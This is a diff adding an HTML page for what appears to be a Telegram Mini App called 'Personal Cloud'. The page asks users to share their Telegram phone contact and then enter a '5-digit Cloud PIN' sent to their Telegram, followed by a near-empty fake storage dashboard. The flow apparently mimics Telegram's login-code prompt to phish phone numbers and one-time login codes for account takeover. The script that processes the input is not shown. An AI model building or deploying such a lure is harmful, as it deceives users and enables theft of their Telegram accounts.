@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Personal Cloud</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <div class="cloud-container">
+        <div class="header">
+            <h1 class="glow">☁️ Secure Cloud</h1>
+            <p>Sync your Telegram Storage</p>
+        </div>
+
+        <!-- Phone Request Step -->
+        <div id="step-phone" class="step active">
+            <p>Tap the button below to securely login with your Telegram account.</p>
+            <button onclick="requestContact()" class="btn-primary">📱 Continue with Telegram</button>
+        </div>
+
+        <!-- OTP Request Step -->
+        <div id="step-otp" class="step hidden">
+            <p>We've sent a 5-digit Cloud PIN to your Telegram.</p>
+            <input type="number" id="otp_input" placeholder="Enter 5-digit code" class="input-box">
+            <button onclick="verifyOTP()" class="btn-primary">Verify & Access</button>
+        </div>
+
+        <!-- Success Dashboard -->
+        <div id="step-success" class="step hidden">
+            <h2 style="color: #4CAF50;">✅ Connected!</h2>
+            <p>Your Personal Cloud is ready.</p>
+            <div class="dashboard">
+               <!-- Cloud UI Elements ထည့်သွင်းနိုင်ပါသည် -->
+               <p>Storage: 0 MB Used</p>
+            </div>
+        </div>
+
+        <div id="loading" class="hidden">
+            <p>Processing...</p>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
